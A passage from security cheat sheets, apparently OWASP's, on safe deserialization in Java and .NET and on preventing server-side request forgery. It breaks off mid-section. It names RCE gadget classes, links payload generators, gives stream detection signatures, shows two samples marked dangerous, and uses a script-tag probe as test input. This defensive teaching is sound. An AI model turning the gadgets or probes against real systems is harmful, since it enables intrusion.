- Use a safe replacement for the generic `readObject()` method as seen here. Note that this addresses "[billion laughs](https://en.wikipedia.org/wiki/Billion_laughs_attack)" type attacks by checking input length and number of objects deserialized.

#### Clear-box Review

Be aware of the following Java API uses for potential serialization vulnerability.

1. `XMLdecoder` with external user defined parameters

2. `XStream` with `fromXML` method (xstream version <= v1.4.6 is vulnerable to the serialization issue)

3. `ObjectInputStream` with `readObject`

4. Uses of `readObject`, `readObjectNoData`, `readResolve` or `readExternal`

5. `ObjectInputStream.readUnshared`

6. `Serializable`

#### Opaque-box Review

If the captured traffic data includes the following patterns, it may suggest that the data was sent in Java serialization streams:

- `AC ED 00 05` in Hex
- `rO0` in Base64
- `Content-type` header of an HTTP response set to `application/x-java-serialized-object`

#### Prevent Data Leakage and Trusted Field Clobbering

If there are data members of an object that should never be controlled by end users during deserialization or exposed to users during serialization, they should be declared as [the `transient` keyword](https://docs.oracle.com/javase/7/docs/platform/serialization/spec/serial-arch.html#7231) (section *Protecting Sensitive Information*).

For a class that defined as Serializable, the sensitive information variable should be declared as `private transient`.

For example, the class `myAccount`, the variables 'profit' and 'margin' were declared as transient to prevent them from being serialized.

```java
public class myAccount implements Serializable
{
    private transient double profit; // declared transient

    private transient double margin; // declared transient
    ....
```

#### Prevent Deserialization of Domain Objects

Some of your application objects may be forced to implement `Serializable` due to their hierarchy. To guarantee that your application objects can't be deserialized, a `readObject()` method should be declared (with a `final` modifier) which always throws an exception:

```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
    throw new java.io.IOException("Cannot be deserialized");
}
```

#### Harden Your Own java.io.ObjectInputStream

The `java.io.ObjectInputStream` class is used to deserialize objects. It's possible to harden its behavior by subclassing it. This is the best solution if:

- you can change the code that does the deserialization;
- you know what classes you expect to deserialize.

The general idea is to override [`ObjectInputStream.html#resolveClass()`](http://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass(java.io.ObjectStreamClass)) in order to restrict which classes are allowed to be deserialized.

Because this call happens before a `readObject()` is called, you can be sure that no deserialization activity will occur unless the type is one that you allow.

A simple example is shown here, where the `LookAheadObjectInputStream` class is guaranteed to **not** deserialize any other type besides the `Bicycle` class:

```java
public class LookAheadObjectInputStream extends ObjectInputStream {

    public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    /**
    * Only deserialize instances of our expected Bicycle class
    */
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!desc.getName().equals(Bicycle.class.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

More complete implementations of this approach have been proposed by various community members:

- [NibbleSec](https://github.com/ikkisoft/SerialKiller) - a library that allows creating lists of classes that are allowed to be deserialized
- [IBM](https://www.ibm.com/developerworks/library/se-lookahead/) - the seminal protection, written years before the most devastating exploitation scenarios were envisioned.
- [Apache Commons IO classes](https://commons.apache.org/proper/commons-io/javadocs/api-2.5/org/apache/commons/io/serialization/ValidatingObjectInputStream.html)

#### Harden All java.io.ObjectInputStream Usage with an Agent

As mentioned above, the `java.io.ObjectInputStream` class is used to deserialize objects. It's possible to harden its behavior by subclassing it. However, if you don't own the code or can't wait for a patch, using an agent to weave in hardening to `java.io.ObjectInputStream` is the best solution.

Globally changing `ObjectInputStream` is only safe for block-listing known malicious types, because it's not possible to know for all applications what the expected classes to be deserialized are. Fortunately, there are very few classes needed in the denylist to be safe from all the known attack vectors, today.

It's inevitable that more "gadget" classes will be discovered that can be abused. However, there is an incredible amount of vulnerable software exposed today, in need of a fix. In some cases, "fixing" the vulnerability may involve re-architecting messaging systems and breaking backwards compatibility as developers move towards not accepting serialized objects.

To enable these agents, simply add a new JVM parameter:

```text
-javaagent:name-of-agent.jar
```

Agents taking this approach have been released by various community members:

- [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

A similar, but less scalable approach would be to manually patch and bootstrap your JVM's ObjectInputStream. Guidance on this approach is available [here](https://github.com/wsargent/paranoid-java-serialization).

#### Other Deserialization Libraries and Formats

While the advice above is focused on [Java's Serializable format](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html), there are a number of other libraries
that use other formats for deserialization. Many of these libraries may have similar security
issues if not configured correctly. This section lists some of these libraries and
recommended configuration options to avoid security issues when deserializing untrusted data:

**Can be used safely with default configuration:**

The following libraries can be used safely with default configuration:

- **[fastjson2](https://github.com/alibaba/fastjson2)** (JSON) - can be used safely as long as
the [**autotype**](https://github.com/alibaba/fastjson2/wiki/fastjson2_autotype_cn) option is not turned on
- **[jackson-databind](https://github.com/FasterXML/jackson-databind)** (JSON) - can be used safely as long
as polymorphism is not used ([see blog post](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062))
- **[Kryo v5.0.0+](https://github.com/EsotericSoftware/kryo)** (custom format) - can be used safely
as long as class registration is not turned **off** ([see documentation](https://github.com/EsotericSoftware/kryo#optional-registration)
and [this issue](https://github.com/EsotericSoftware/kryo/issues/929))
- **[YamlBeans v1.16+](https://github.com/EsotericSoftware/yamlbeans)** (YAML) - can be used safely
as long as the **UnsafeYamlConfig** class isn't used (see [this commit](https://github.com/EsotericSoftware/yamlbeans/commit/b1122588e7610ae4e0d516c50d08c94ee87946e6))
    - *NOTE: because these versions are not available in Maven Central,
[a fork exists](https://github.com/Contrast-Security-OSS/yamlbeans) that can be used instead.*
- **[XStream v1.4.17+](https://x-stream.github.io/)** (JSON and XML) - can be used safely
as long as the allowlist and other security controls are not relaxed ([see documentation](https://x-stream.github.io/security.html))

**Requires configuration before can be used safely:**

The following libraries require configuration options to be set before they can be used safely:

- **[fastjson v1.2.68+](https://github.com/alibaba/fastjson)** (JSON) - cannot be used safely unless
the [**safemode**](https://github.com/alibaba/fastjson/wiki/fastjson_safemode_en) option is turned on, which disables
deserialization of any class ([see documentation](https://github.com/alibaba/fastjson/wiki/enable_autotype)).
Previous versions are not safe.
- **[json-io](https://github.com/jdereg/json-io)** (JSON) - cannot be used safely since the use of **@type** property in
JSON allows deserialization of any class. Can only be used safely in following situations:
    - In [non-typed mode](https://github.com/jdereg/json-io/blob/master/user-guide.md#non-typed-usage) using the **JsonReader.USE_MAPS** setting which turns off generic object deserialization
    - [With a custom deserializer](https://github.com/jdereg/json-io/blob/master/user-guide.md#customization-technique-4-custom-serializer) controlling which classes get deserialized
- **[Kryo < v5.0.0](https://github.com/EsotericSoftware/kryo)** (custom format) - cannot be used safely unless class registration is turned **on**,
which disables deserialization of any class ([see documentation](https://github.com/EsotericSoftware/kryo#optional-registration)
and [this issue](https://github.com/EsotericSoftware/kryo/issues/929))
    - *NOTE: other wrappers exist around Kryo such as [Chill](https://github.com/twitter/chill), which may also have class registration
not required by default regardless of the underlying version of Kryo being used*
- **[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/src)** (YAML) - cannot be used safely unless
the **org.yaml.snakeyaml.constructor.SafeConstructor** class is used, which disables
deserialization of any class ([see docs](https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471))

**Cannot be used safely:**

The following libraries are either no longer maintained or cannot be used safely with untrusted input:

- **[Castor](https://github.com/castor-data-binding/castor)** (XML) - appears to be abandoned with no commits since 2016
- **[fastjson < v1.2.68](https://github.com/alibaba/fastjson)** (JSON) - these versions allows deserialization of any class
([see documentation](https://github.com/alibaba/fastjson/wiki/enable_autotype))
- **[XMLDecoder in the JDK](https://docs.oracle.com/javase/8/docs/api/java/beans/XMLDecoder.html)** (XML) - *"close to impossible to securely deserialize Java objects in this format from untrusted inputs"*
("Red Hat Defensive Coding Guide", [end of section 2.6.5](https://redhat-crypto.gitlab.io/defensive-coding-guide/#sect-Defensive_Coding-Tasks-Serialization-XML))
- **[XStream < v1.4.17](https://x-stream.github.io/)** (JSON and XML) - these versions allows deserialization of any class (see [documentation](https://x-stream.github.io/security.html#explicit))
- **[YamlBeans < v1.16](https://github.com/EsotericSoftware/yamlbeans)** (YAML) - these versions allows deserialization of any class
(see [this document](https://github.com/Contrast-Security-OSS/yamlbeans/blob/main/SECURITY.md))

### .Net CSharp

#### Clear-box Review

Search the source code for the following terms:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Look for any serializers where the type is set by a user controlled variable.

#### Opaque-box Review

Search for the following base64 encoded content that starts with:

```text
AAEAAAD/////
```

Search for content with the following text:

1. `TypeObject`
2. `$type:`

#### General Precautions

Microsoft has stated that the `BinaryFormatter` type is dangerous and cannot be secured. As such, it should not be used. Full details are in the [BinaryFormatter security guide](https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide).

Don't allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the `DataContractSerializer` or `XmlSerializer` if at all possible.

Where `JSON.Net` is being used make sure the `TypeNameHandling` is only set to `None`.

```csharp
TypeNameHandling = TypeNameHandling.None
```

If `JavaScriptSerializer` is to be used then do not use it with a `JavaScriptTypeResolver`.

If you must deserialize data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g.

```csharp
System.IO.FileInfo
```

`FileInfo` objects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack.

Even if you have limited the types that can be deserialized remember that some types have properties that are risky. `System.ComponentModel.DataAnnotations.ValidationException`, for example has a property `Value` of type `Object`. if this type is the type allowed for deserialization then an attacker can set the `Value` property to any object type they choose.

Attackers should be prevented from steering the type that will be instantiated. If this is possible then even `DataContractSerializer` or `XmlSerializer` can be subverted e.g.

```csharp
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```

Execution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective.

```csharp
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
    //generate warnings and dispose of suspectObject
}
```

For `JSON.Net` it is possible to create a safer form of allow-list control using a custom `SerializationBinder`.

Try to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes. **A deserializer can only instantiate types that it knows about**.

Try to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example `System.Windows.Data.ObjectDataProvider` used in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data.

#### Known .NET RCE Gadgets

- `System.Configuration.Install.AssemblyInstaller`
- `System.Activities.Presentation.WorkflowDesigner`
- `System.Windows.ResourceDictionary`
- `System.Windows.Data.ObjectDataProvider`
- `System.Windows.Forms.BindingSource`
- `Microsoft.Exchange.Management.SystemManager.WinForms.ExchangeSettingsProvider`
- `System.Data.DataViewManager, System.Xml.XmlDocument/XmlDataDocument`
- `System.Management.Automation.PSObject`

## Language-Agnostic Methods for Deserializing Safely

### Using Alternative Data Formats

A great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a pure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed towards malicious ends.

Many applications rely on a [data-transfer object pattern](https://en.wikipedia.org/wiki/Data_transfer_object) that involves creating a separate domain of objects for the explicit purpose data transfer. Of course, it's still possible that the application will make security mistakes after a pure data object is parsed.

### Only Deserialize Signed Data

If the application knows before deserialization which messages will need to be processed, they could sign them as part of the serialization process. The application could then to choose not to deserialize any message which didn't have an authenticated signature.

## Mitigation Tools/Libraries

- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)
- [SWAT - tool for creating allowlists](https://github.com/cschneider4711/SWAT)
- [NotSoSerial](https://github.com/kantega/notsoserial)

## Detection Tools

- [Java deserialization cheat sheet aimed at pen testers](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)
- [Java De-serialization toolkits](https://github.com/brianwrf/hackUtils)
- [Java de-serialization tool](https://github.com/frohoff/ysoserial)
- [.Net payload generator](https://github.com/pwntester/ysoserial.net)
- [Burp Suite extension](https://github.com/federicodotta/Java-Deserialization-Scanner/releases)
- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)
- [Serianalyzer is a static bytecode analyzer for deserialization](https://github.com/mbechler/serianalyzer)
- [Payload generator](https://github.com/mbechler/marshalsec)
- [Android Java Deserialization Vulnerability Tester](https://github.com/modzero/modjoda)
- Burp Suite Extension
    - [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)
    - [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
    - [Burp-ysoserial](https://github.com/summitt/burp-ysoserial)
    - [SuperSerial](https://github.com/DirectDefense/SuperSerial)
    - [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)

## References

- [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [Deserialization of untrusted data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
- [Java Deserialization Attacks - German OWASP Day 2016](../assets/Deserialization_Cheat_Sheet_GOD16Deserialization.pdf)
- [AppSecCali 2015 - Marshalling Pickles](http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles)
- [FoxGlove Security - Vulnerability Announcement](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere)
- [Java deserialization cheat sheet aimed at pen testers](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.](https://github.com/frohoff/ysoserial)
- [Java De-serialization toolkits](https://github.com/brianwrf/hackUtils)
- [Java de-serialization tool](https://github.com/frohoff/ysoserial)
- [Burp Suite extension](https://github.com/federicodotta/Java-Deserialization-Scanner/releases)
- [Java secure deserialization library](https://github.com/ikkisoft/SerialKiller)
- [Serianalyzer is a static bytecode analyzer for deserialization](https://github.com/mbechler/serianalyzer)
- [Payload generator](https://github.com/mbechler/marshalsec)
- [Android Java Deserialization Vulnerability Tester](https://github.com/modzero/modjoda)
- Burp Suite Extension
    - [JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller)
    - [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)
    - [Burp-ysoserial](https://github.com/summitt/burp-ysoserial)
    - [SuperSerial](https://github.com/DirectDefense/SuperSerial)
    - [SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active)
- .Net
    - [Alvaro Muñoz: .NET Serialization: Detecting and defending vulnerable endpoints](https://www.youtube.com/watch?v=qDoBlLwREYk)
    - [James Forshaw - Black Hat USA 2012 - Are You My Type? Breaking .net Sandboxes Through Serialization](https://www.youtube.com/watch?v=Xfbu-pQ1tIc)
    - [Jonathan Birch BlueHat v17 - Dangerous Contents - Securing .Net Deserialization](https://www.youtube.com/watch?v=oxlD8VWWHE8)
    - [Alvaro Muñoz & Oleksandr Mirosh - Friday the 13th: Attacking JSON - AppSecUSA 2017](https://www.youtube.com/watch?v=NqHsaVhlxAQ)
- Python
    - [Exploiting Insecure Deserialization bugs found in the Wild (Python Pickles)](https://macrosec.tech/index.php/2021/06/29/exploiting-insecuredeserialization-bugs-found-in-the-wild-python-pickles.)


---
# Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md

# Server-Side Request Forgery Prevention Cheat Sheet

## Introduction

The objective of the cheat sheet is to provide advices regarding the protection against [Server Side Request Forgery](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/) (SSRF) attack.

This cheat sheet will focus on the defensive point of view and will not explain how to perform this attack. This [talk](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf) from the security researcher [Orange Tsai](https://twitter.com/orange_8361) as well as this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf) provide techniques on how to perform this kind of attack.

## Context

SSRF is an attack vector that abuses an application to interact with the internal/external network or the machine itself. One of the enablers for this vector is the mishandling of URLs, as showcased in the following examples:

- Image on an external server (*e.g.* user enters image URL of their avatar for the application to download and use).
- Custom [WebHook](https://en.wikipedia.org/wiki/Webhook) (users have to specify Webhook handlers or Callback URLs).
- Internal requests to interact with another service to serve a specific functionality. Most of the times, user data is sent along to be processed, and if poorly handled, can perform specific injection attacks.

## Overview of a SSRF common flow

![SSRF Common Flow](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Common_Flow.png)

*Notes:*

- SSRF is not limited to the HTTP protocol. Generally, the first request is HTTP, but in cases where the application itself performs the second request, it could use different protocols (*e.g.* FTP, SMB, SMTP, etc.) and schemes (*e.g.* `file://`, `phar://`, `gopher://`, `data://`, `dict://`, etc.).
- If the application is vulnerable to [XML eXternal Entity (XXE) injection](https://portswigger.net/web-security/xxe) then it can be exploited to perform a [SSRF attack](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), take a look at the [XXE cheat sheet](XML_External_Entity_Prevention_Cheat_Sheet.md) to learn how to prevent the exposure to XXE.

## Cases

Depending on the application's functionality and requirements, there are two basic cases in which SSRF can happen:

- Application can send request only to **identified and trusted applications**: Case when [allowlist](https://en.wikipedia.org/wiki/Whitelisting) approach is available.
- Application can send requests to **ANY external IP address or domain name**: Case when [allowlist](https://en.wikipedia.org/wiki/Whitelisting) approach is unavailable.

Because these two cases are very different, this cheat sheet will describe defences against them separately.

### Case 1 - Application can send request only to identified and trusted applications

Sometimes, an application needs to perform a request to another application, often located on another network, to perform a specific task. Depending on the business case, user input is required for the functionality to work.

#### Example

 > Take the example of a web application that receives and uses personal information from a user, such as their first name, last name, birth date etc. to create a profile in an internal HR system. By design, that web application will have to communicate using a protocol that the HR system understands to process that data.
 > Basically, the user cannot reach the HR system directly, but, if the web application in charge of receiving user information is vulnerable to SSRF, the user can leverage it to access the HR system.
 > The user leverages the web application as a proxy to the HR system.

The allowlist approach is a viable option since the internal application called by the *VulnerableApplication* is clearly identified in the technical/business flow. It can be stated that the required calls will only be targeted between those identified and trusted applications.

#### Available protections

Several protective measures are possible at the **Application** and **Network** layers. To apply the **defense in depth** principle, both layers will be hardened against such attacks.

##### Application layer

The first level of protection that comes to mind is [Input validation](Input_Validation_Cheat_Sheet.md).

Based on that point, the following question comes to mind: *How to perform this input validation?*

As [Orange Tsai](https://twitter.com/orange_8361) shows in his [talk](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf), depending on the programming language used, parsers can be abused. One possible countermeasure is to apply the [allowlist approach](Input_Validation_Cheat_Sheet.md#allow-list-vs-block-list) when input validation is used because, most of the time, the format of the information expected from the user is globally known.

The request sent to the internal application will be based on the following information:

- String containing business data.
- IP address (V4 or V6).
- Domain name.
- URL.

**Note:** Disable the support for the following of the [redirection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections) in your web client in order to prevent the bypass of the input validation described in the section `Exploitation tricks > Bypassing restrictions > Input validation > Unsafe redirect` of this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).

###### String

In the context of SSRF, validations can be added to ensure that the input string respects the business/technical format expected.

A [regex](https://www.regular-expressions.info/) can be used to ensure that data received is valid from a security point of view if the input data have a simple format (*e.g.* token, zip code, etc.). Otherwise, validation should be conducted using the libraries available from the `string` object because regex for complex formats are difficult to maintain and are highly error-prone.

User input is assumed to be non-network related and consists of the user's personal information.

Example:

```java
//Regex validation for a data having a simple format
if(Pattern.matches("[a-zA-Z0-9\\s\\-]{1,50}", userInput)){
    //Continue the processing because the input data is valid
}else{
    //Stop the processing and reject the request
}
```

###### IP address

In the context of SSRF, there are 2 possible validations to perform:

1. Ensure that the data provided is a valid IP V4 or V6 address.
2. Ensure that the IP address provided belongs to one of the IP addresses of the identified and trusted applications.

The first layer of validation can be applied using libraries that ensure the security of the IP address format, based on the technology used (library option is proposed here to delegate the managing of the IP address format and leverage battle-tested validation function):

> Verification of the proposed libraries has been performed regarding the exposure to bypasses (Hex, Octal, Dword, URL and Mixed encoding) described in this [article](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b).

- **JAVA:** Method [InetAddressValidator.isValid](http://commons.apache.org/proper/commons-validator/apidocs/org/apache/commons/validator/routines/InetAddressValidator.html#isValid(java.lang.String)) from the [Apache Commons Validator](http://commons.apache.org/proper/commons-validator/) library.
    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.
- **.NET**: Method [IPAddress.TryParse](https://docs.microsoft.com/en-us/dotnet/api/system.net.ipaddress.tryparse?view=netframework-4.8) from the SDK.
    - **It is exposed** to bypass using Hex, Octal, Dword and Mixed encoding but **NOT** the URL encoding.
    - As allowlisting is used here, any bypass tentative will be blocked during the comparison against the allowed list of IP addresses.
- **JavaScript**: Library [ip-address](https://www.npmjs.com/package/ip-address).
    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.
- **Ruby**: Class [IPAddr](https://ruby-doc.org/stdlib-2.0.0/libdoc/ipaddr/rdoc/IPAddr.html) from the SDK.
    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.

> **Use the output value of the method/library as the IP address to compare against the allowlist.**

After ensuring the validity of the incoming IP address, the second layer of validation is applied. An allowlist is created after determining all the IP addresses (v4 and v6 to avoid bypasses) of the identified and trusted applications. The valid IP is cross-checked with that list to ensure its communication with the internal application (string strict comparison with case sensitive).

###### Domain name

In the attempt of validate domain names, it is apparent to do a DNS resolution to verify the existence of the domain. In general, it is not a bad idea, yet it opens up the application to attacks depending on the configuration used regarding the DNS servers used for the domain name resolution:

- It can disclose information to external DNS resolvers.
- It can be used by an attacker to bind a legit domain name to an internal IP address. See the section `Exploitation tricks > Bypassing restrictions > Input validation > DNS pinning` of this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).
- An attacker can use it to deliver a malicious payload to the internal DNS resolvers and the API (SDK or third-party) used by the application to handle the DNS communication and then, potentially, trigger a vulnerability in one of these components.

In the context of SSRF, there are two validations to perform:

1. Ensure that the data provided is a valid domain name.
2. Ensure that the domain name provided belongs to one of the domain names of the identified and trusted applications (the allowlisting comes to action here).

Similar to the IP address validation, the first layer of validation can be applied using libraries that ensure the security of the domain name format, based on the technology used (library option is proposed here in order to delegate the managing of the domain name format and leverage battle tested validation function):

> Verification of the proposed libraries has been performed to ensure that the proposed functions do not perform any DNS resolution query.

- **JAVA:** Method [DomainValidator.isValid](https://commons.apache.org/proper/commons-validator/apidocs/org/apache/commons/validator/routines/DomainValidator.html#isValid(java.lang.String)) from the [Apache Commons Validator](http://commons.apache.org/proper/commons-validator/) library.
- **.NET**: Method [Uri.CheckHostName](https://docs.microsoft.com/en-us/dotnet/api/system.uri.checkhostname?view=netframework-4.8) from the SDK.
- **JavaScript**: Library [is-valid-domain](https://www.npmjs.com/package/is-valid-domain).
- **Python**: Module [validators.domain](https://validators.readthedocs.io/en/latest/#module-validators.domain).
- **Ruby**: No valid dedicated gem has been found.
    - [domainator](https://github.com/mhuggins/domainator), [public_suffix](https://github.com/weppos/publicsuffix-ruby) and [addressable](https://github.com/sporkmonger/addressable) has been tested but unfortunately they all consider `<script>alert(1)</script>.owasp.org` as a valid domain name.
    - This regex, taken from [here](https://stackoverflow.com/a/26987741), can be used: `^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\.)*(xn--)?([a-z0-9][a-z0-9\-]{0,60}|[a-z0-9-]{1,30}\.[a-z]{2,})$`

Example of execution of the proposed regex for Ruby:

```ruby
domain_names = ["owasp.org","owasp-test.org","doc-test.owasp.org","doc.owasp.org",
                "<script>alert(1)</script>","<script>alert(1)</script>.owasp.org"]
domain_names.each { |domain_name|
    if ( domain_name =~ /^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\.)*(xn--)?([a-z0-9][a-z0-9\-]{0,60}|[a-z0-9-]{1,30}\.[a-z]{2,})$/ )
        puts "[i] #{domain_name} is VALID"
    else
        puts "[!] #{domain_name} is INVALID"
    end
}
```

```bash
$ ruby test.rb
[i] owasp.org is VALID
[i] owasp-test.org is VALID
[i] doc-test.owasp.org is VALID
[i] doc.owasp.org is VALID
[!] <script>alert(1)</script> is INVALID
[!] <script>alert(1)</script>.owasp.org is INVALID
```

After ensuring the validity of the incoming domain name, the second layer of validation is applied:

1. Build an allowlist with all the domain names of every identified and trusted applications.
2. Verify that the domain name received is part of this allowlist (string strict comparison with case sensitive).

Unfortunately here, the application is still vulnerable to the `DNS pinning` bypass mentioned in this [document](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf). Indeed, a DNS resolution will be made when the business code will be executed. To address that issue, the following action must be taken in addition of the validation on the domain name:

1. Ensure that the domains that are part of your organization are resolved by your internal DNS server first in the chains of DNS resolvers.
2. Monitor the domains allowlist in order to detect when any of them resolves to a/an:
   - Local IP address (V4 + V6).
   - Internal IP of your organization (expected to be in private IP ranges) for the domain that are not part of your organization.

The following Python3 script can be used, as a starting point, for the monitoring mentioned above:

```python
# Dependencies: pip install ipaddress dnspython
import ipaddress
import dns.resolver

# Configure the allowlist to check
DOMAINS_ALLOWLIST = ["owasp.org", "labslinux"]

# Configure the DNS resolver to use for all DNS queries
DNS_RESOLVER = dns.resolver.Resolver()
DNS_RESOLVER.nameservers = ["1.1.1.1"]

def verify_dns_records(domain, records, type):
    """
    Verify if one of the DNS records resolve to a non public IP address.
    Return a boolean indicating if any error has been detected.
    """
    error_detected = False
    if records is not None:
        for record in records:
            value = record.to_text().strip()
            try:
                ip = ipaddress.ip_address(value)
                # See https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv4Address.is_global
                if not ip.is_global:
                    print("[!] DNS record type '%s' for domain name '%s' resolve to
                    a non public IP address '%s'!" % (type, domain, value))
                    error_detected = True
            except ValueError:
                error_detected = True
                print("[!] '%s' is not valid IP address!" % value)
    return error_detected

def check():
    """
    Perform the check of the allowlist of domains.
    Return a boolean indicating if any error has been detected.
    """
    error_detected = False
    for domain in DOMAINS_ALLOWLIST:
        # Get the IPs of the current domain
        # See https://en.wikipedia.org/wiki/List_of_DNS_record_types
        try:
            # A = IPv4 address record
            ip_v4_records = DNS_RESOLVER.query(domain, "A")
        except Exception as e:
            ip_v4_records = None
            print("[i] Cannot get A record for domain '%s': %s\n" % (domain,e))
        try:
            # AAAA = IPv6 address record
            ip_v6_records = DNS_RESOLVER.query(domain, "AAAA")
        except Exception as e:
            ip_v6_records = None
            print("[i] Cannot get AAAA record for domain '%s': %s\n" % (domain,e))
        # Verify the IPs obtained
        if verify_dns_records(domain, ip_v4_records, "A")
        or verify_dns_records(domain, ip_v6_records, "AAAA"):
            error_detected = True
    return error_detected

if __name__== "__main__":
    if check():
        exit(1)
    else:
        exit(0)
```

###### URL

Do not accept complete URLs from the user because URL are difficult to validate and the parser can be abused depending on the technology used as showcased by the following [talk](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf) of [Orange Tsai](https://twitter.com/orange_8361).

If network related information is really needed then only accept a valid IP address or domain name.

##### Network layer

The objective of the Network layer security is to prevent the *VulnerableApplication* from performing calls to arbitrary applications. Only allowed *routes* will be available for this application in order to limit its network access to only those that it should communicate with.

The Firewall component, as a specific device or using the one provided within the operating system, will be used here to define the legitimate flows.

In the schema below, a Firewall component is leveraged to limit the application's access, and in turn, limit the impact of an application vulnerable to SSRF:

![Case 1 for Network layer protection about flows that we want to prevent](../assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Case1_NetworkLayer_PreventFlow.png)

[Network segregation](https://www.mwrinfosecurity.com/our-thinking/making-the-case-for-network-segregation) (see this set of [implementation advice](https://www.cyber.gov.au/acsc/view-all-content/publications/implementing-network-segmentation-and-segregation) can also be leveraged and **is highly recommended in order to block illegitimate calls directly at network level itself**.

### Case 2 - Application can send requests to ANY external IP address or domain name

This case happens when a user can control a URL to an **External** resource and the application makes a request to this URL (e.g. in case of [WebHooks](https://en.wikipedia.org/wiki/Webhook)). Allow lists cannot be used here because the list of IPs/domains is often unknown upfront and is dynamically changing.

In this scenario, *External* refers to any IP that doesn't belong to the internal network, and should be reached by going over the public internet.

Thus, the call from the *Vulnerable Application*:

- **Is NOT** targeting one of the IP/domain *located inside* the company's global network.
- Uses a convention defined between the *VulnerableApplication* and the expected IP/domain in order to *prove* that the call has been legitimately initiated.

#### Challenges in blocking URLs at application layer

Based on the business requirements of the above mentioned applications, the allowlist approach is not a valid solution. Despite knowing that the block-list approach is not an impenetrable wall, it is the best solution in this scenario. It is informing the application what it should **not** do.

Here is why filtering URLs is hard at the Application layer:

- It implies that the application must be able to detect, at the code level, that the provided IP (V4 + V6) is not part of the official [private networks ranges](https://en.wikipedia.org/wiki/Private_network) including also *localhost* and *IPv4/v6 Link-Local* addresses. Not every SDK provides a built-in feature for this kind of verification, and leaves the handling up to the developer to understand all of its pitfalls and possible values, which makes it a demanding task.
- Same remark for domain name: The company must maintain a list of all internal domain names and provide a centralized service to allow an application to verify if a provided domain name is an internal one. For this verification, an internal DNS resolver can be queried by the application but this internal DNS resolver must not resolve external domain names.

#### Available protections

Taking into consideration the same assumption in the following [example](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#example) for the following sections.

##### Application layer

